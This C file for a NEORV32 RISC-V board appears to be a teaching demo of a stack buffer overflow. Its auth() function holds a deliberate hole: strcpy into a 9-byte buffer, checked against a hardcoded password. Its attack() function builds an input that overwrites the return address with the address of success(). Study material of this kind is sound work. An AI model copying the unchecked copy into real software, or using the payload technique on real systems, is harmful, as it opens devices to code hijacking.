#include <string.h>
#include <stdio.h>
#include <neorv32.h>

#define BAUD_RATE 19200

/* The user authentication succeeded */
void success()
{
    neorv32_uart0_print("You win\n");
}

/* The user authentication failed */
void failure()
{
    neorv32_uart0_print("You lose\n");
}

/**
 * @brief Takes a 8 character password and verifies it
 *
 * @param password the user submitted password
 */
void auth(char *password)
{

    neorv32_uart0_print("In auth\n");
    /* Copies the password because security */
    char buffer[9];
    // neorv32_uart0_print("The address of the buffer is \n");

    strcpy(buffer, password);

    if (strcmp(buffer, "p@ssw0rd") == 0)
    {
        success();
    }
    else
    {
        failure();
    }
    neorv32_uart0_printf("%s\nend auth\n", buffer);
}

void attack()
{
    neorv32_uart0_print("in attack\n");
    char rac[8];
    uintptr_t ra = (uintptr_t)success;
    for (size_t i = 0; i < 8; i++)
    {
        rac[i] = (ra >> (8 * i)) & 0xff;
        neorv32_uart0_printf("%d\n", rac[i]);
    }

    // char password[80] = "An old silent pond... A frog jumps into the pond, splash! Silence again.12345678";
    char password[40] = "An old silent pond... A-12345678--\n";
    strcpy(password + 24, rac);
    neorv32_uart0_printf("%d\n%s\n", ra, password);
}

int main(int argc, char *argv[])
{
    neorv32_rte_setup();

    // init UART at default baud rate, no parity bits, ho hw flow control
    neorv32_uart0_setup(BAUD_RATE, PARITY_NONE, FLOW_CONTROL_NONE);

    // check available hardware extensions and compare with compiler flags
    neorv32_rte_check_isa(0); // silent = 0 -> show message if isa mismatch

    attack();

    neorv32_uart0_print("\nEnter password\n");
    char buf[50];
    neorv32_uart0_scan(buf, 50, 1);
    neorv32_uart0_print("\nBefore auth\n");
    auth(buf);

    neorv32_uart0_print("Goodbye\n");
    return 0;
}